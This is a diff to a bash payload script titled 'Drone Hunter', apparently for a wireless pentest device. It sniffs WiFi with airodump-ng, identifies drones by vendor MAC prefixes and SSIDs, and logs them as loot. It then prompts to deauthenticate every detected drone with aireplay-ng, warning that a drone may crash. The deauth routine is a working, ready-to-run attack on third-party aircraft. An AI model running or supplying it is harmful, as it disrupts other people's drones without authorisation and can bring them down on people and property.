@@ -1,10 +1,9 @@
-#!/bin/sh
+#!/bin/bash
 # Title: Drone Hunter
 # Author: bad-antics
 # Description: Detect and identify nearby drones by WiFi
 # Category: nullsec/recon
 
-# Known drone OUIs and SSIDs
 DRONE_OUIS="60:60:1F:DJI
 34:D2:62:DJI
 48:1C:B9:DJI
@@ -19,7 +18,7 @@ A0:14:3D:Parrot
 90:3A:E6:Autel
 2C:41:A1:Yuneec
 60:A4:4C:Skydio
-9C:4E:36:Holy Stone
+9C:4E:36:Holy_Stone
 A0:C9:A0:Syma
 4C:49:E3:Autel"
 
@@ -33,57 +32,65 @@ WiFi signatures.
 Identifies DJI, Parrot,
 Autel, Yuneec, and more.
 
-Press OK to continue."
+Press OK to configure."
 
-INTERFACE="wlan0"
+# Use existing monitor interface
+MON_IF=""
+for iface in wlan1mon wlan2mon wlan0mon; do
+    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
+done
+[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!
 
-# Prepare
-airmon-ng check kill 2>/dev/null
-sleep 1
-airmon-ng start $INTERFACE >/dev/null 2>&1
-MON_IF="${INTERFACE}mon"
-[ ! -d "/sys/class/net/$MON_IF" ] && MON_IF="$INTERFACE"
+Run: airmon-ng start wlan1"; exit 1; }
 
 DURATION=$(NUMBER_PICKER "Scan time (sec):" 30)
+case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=30 ;; esac
+
+resp=$(CONFIRMATION_DIALOG "START DRONE SCAN?
+
+Interface: $MON_IF
+Duration: ${DURATION}s
+
+Press OK to scan.")
+[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0
 
 SPINNER_START "Scanning for drones..."
 
-# Scan
 TEMP_DIR="/tmp/dronehunt_$$"
 mkdir -p "$TEMP_DIR"
-timeout $DURATION airodump-ng $MON_IF -w "$TEMP_DIR/scan" --output-format csv 2>/dev/null &
-sleep $DURATION
+rm -f /tmp/dronehunt_*
+timeout "$DURATION" airodump-ng "$MON_IF" -w "$TEMP_DIR/scan" --output-format csv 2>/dev/null &
+sleep "$DURATION"
+killall airodump-ng 2>/dev/null
 
 SPINNER_STOP
 
-# Parse for drones
 LOOT_DIR="/mmc/nullsec/drones"
 mkdir -p "$LOOT_DIR"
 LOOT_FILE="$LOOT_DIR/drones_$(date +%Y%m%d_%H%M%S).txt"
 
 echo "Drone Hunter Results" > "$LOOT_FILE"
 echo "Date: $(date)" >> "$LOOT_FILE"
+echo "Interface: $MON_IF" >> "$LOOT_FILE"
 echo "Scan Duration: ${DURATION}s" >> "$LOOT_FILE"
 echo "---" >> "$LOOT_FILE"
 
 FOUND=0
 
-# Check by OUI
-while IFS=',' read -r BSSID F2 F3 CHANNEL F5 SPEED PRIVACY CIPHER AUTH POWER F11 F12 F13 ESSID REST; do
-    BSSID=$(echo "$BSSID" | tr -d ' ' | tr '[:lower:]' '[:upper:]')
-    ESSID=$(echo "$ESSID" | tr -d ' ')
-    
-    if [ -n "$BSSID" ] && echo "$BSSID" | grep -qE "^[0-9A-Fa-f]{2}:"; then
+if [ -f "$TEMP_DIR/scan-01.csv" ]; then
+    while IFS=',' read -r BSSID F2 F3 CHANNEL F5 SPEED PRIVACY CIPHER AUTH POWER F11 F12 F13 ESSID REST; do
+        BSSID=$(echo "$BSSID" | tr -d ' ' | tr '[:lower:]' '[:upper:]')
+        ESSID=$(echo "$ESSID" | sed 's/^[[:space:]]*//')
+
+        [[ ! "$BSSID" =~ ^[0-9A-Fa-f]{2}: ]] && continue
+
         OUI=$(echo "$BSSID" | cut -d':' -f1-3)
-        
-        # Check OUI
+
         DRONE_TYPE=""
-        if echo "$DRONE_OUIS" | grep -qi "$OUI"; then
-            DRONE_TYPE=$(echo "$DRONE_OUIS" | grep -i "$OUI" | cut -d':' -f4)
-        fi
-        
-        # Check SSID
-        if [ -z "$DRONE_TYPE" ] && echo "$ESSID" | grep -qiE "$DRONE_SSIDS"; then
+        MATCH=$(echo "$DRONE_OUIS" | grep -i "^$OUI" | head -1 | awk -F: '{print $4}')
+        [ -n "$MATCH" ] && DRONE_TYPE="$MATCH"
+
+        if [ -z "$DRONE_TYPE" ] && [ -n "$ESSID" ] && echo "$ESSID" | grep -qiE "$DRONE_SSIDS"; then
             if echo "$ESSID" | grep -qi "DJI\|Spark\|Mavic\|Phantom\|TELLO"; then
                 DRONE_TYPE="DJI"
             elif echo "$ESSID" | grep -qi "Parrot\|Anafi\|Bebop"; then
@@ -95,25 +102,23 @@ while IFS=',' read -r BSSID F2 F3 CHANNEL F5 SPEED PRIVACY CIPHER AUTH POWER F11
             elif echo "$ESSID" | grep -qi "Skydio"; then
                 DRONE_TYPE="Skydio"
             else
-                DRONE_TYPE="Unknown"
+                DRONE_TYPE="Unknown_Drone"
             fi
         fi
-        
+
         if [ -n "$DRONE_TYPE" ]; then
             echo "" >> "$LOOT_FILE"
             echo "DRONE DETECTED!" >> "$LOOT_FILE"
-            echo "Type: $DRONE_TYPE" >> "$LOOT_FILE"
-            echo "BSSID: $BSSID" >> "$LOOT_FILE"
-            echo "SSID: $ESSID" >> "$LOOT_FILE"
-            echo "Channel: $CHANNEL" >> "$LOOT_FILE"
-            echo "Signal: $POWER dBm" >> "$LOOT_FILE"
-            ((FOUND++))
+            echo "  Type: $DRONE_TYPE" >> "$LOOT_FILE"
+            echo "  BSSID: $BSSID" >> "$LOOT_FILE"
+            echo "  SSID: $ESSID" >> "$LOOT_FILE"
+            echo "  Channel: $(echo $CHANNEL | tr -d ' ')" >> "$LOOT_FILE"
+            echo "  Signal: $(echo $POWER | tr -d ' ') dBm" >> "$LOOT_FILE"
+            FOUND=$((FOUND + 1))
         fi
-    fi
-done < "$TEMP_DIR/scan-01.csv"
+    done < "$TEMP_DIR/scan-01.csv"
+fi
 
-# Cleanup
-airmon-ng stop $MON_IF 2>/dev/null
 rm -rf "$TEMP_DIR"
 
 if [ "$FOUND" -gt 0 ]; then
@@ -122,34 +127,25 @@ if [ "$FOUND" -gt 0 ]; then
 Check $LOOT_FILE
 for details.
 
-Detected types may include
-DJI, Parrot, Autel, etc.
-
 Press OK to continue."
-    
+
     resp=$(CONFIRMATION_DIALOG "DEAUTH DRONES?
 
-This will disconnect
-all detected drones
-from their controllers.
+Disconnect $FOUND drones
+from controllers.
 
-WARNING: Dangerous!
-Drone may crash.
+WARNING: Drone may crash!
 
 Confirm?")
-    
+
     if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
-        airmon-ng start $INTERFACE >/dev/null 2>&1
         LOG "Deauthing drones..."
-        
-        grep "BSSID:" "$LOOT_FILE" | cut -d':' -f2- | tr -d ' ' | while read DRONE_MAC; do
-            aireplay-ng --deauth 50 -a "$DRONE_MAC" $MON_IF >/dev/null 2>&1 &
+        grep "BSSID:" "$LOOT_FILE" | sed 's/.*BSSID: //' | tr -d ' ' | while read DRONE_MAC; do
+            [ -n "$DRONE_MAC" ] && timeout 15 aireplay-ng --deauth 50 -a "$DRONE_MAC" "$MON_IF" 2>/dev/null &
         done
-        
-        sleep 10
+        sleep 15
         killall aireplay-ng 2>/dev/null
-        airmon-ng stop $MON_IF 2>/dev/null
-        
+
         PROMPT "DEAUTH COMPLETE
 
 All detected drones
@@ -161,7 +157,7 @@ else
     PROMPT "NO DRONES FOUND
 
 No drone WiFi signals
-detected in ${DURATION}s scan.
+detected in ${DURATION}s.
 
 Try longer scan or
 different location.
